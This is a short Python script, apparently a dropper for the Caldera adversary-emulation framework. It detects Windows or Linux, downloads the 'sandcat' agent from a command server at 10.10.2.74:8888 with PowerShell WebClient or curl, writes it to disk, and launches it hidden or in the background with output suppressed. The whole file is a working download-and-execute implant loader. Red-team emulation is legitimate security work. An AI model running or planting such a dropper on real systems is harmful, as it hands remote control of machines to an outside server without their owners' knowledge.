import subprocess
import platform

ps_command = r"""$server="http://10.10.2.74:8888";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;  
$wc.Headers.add("platform","windows"); 
$wc.Headers.add("file","sandcat.go"); 
$data=$wc.DownloadData($url); 
get-process | ? {$_.modules.filename -like "C:\Users\Public\caldera.exe"} | stop-process -f;
rm -force "C:\Users\Public\caldera.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\caldera.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\caldera.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;"""

lin_command = """server="http://10.10.2.74:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > caldera;
chmod +x caldera; ./caldera -server $server -group red -v &"""

os_name = platform.system()

if os_name == "Windows":
    print("Windows machine")
    subprocess.run(["powershell.exe", "-Command", ps_command], capture_output=True, text=True)
elif os_name == "Linux":
    print("This is a Linux operating system.")
    subprocess.run([lin_command], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, shell=True, text=True)

else:
    print("This is an unknown operating system.")
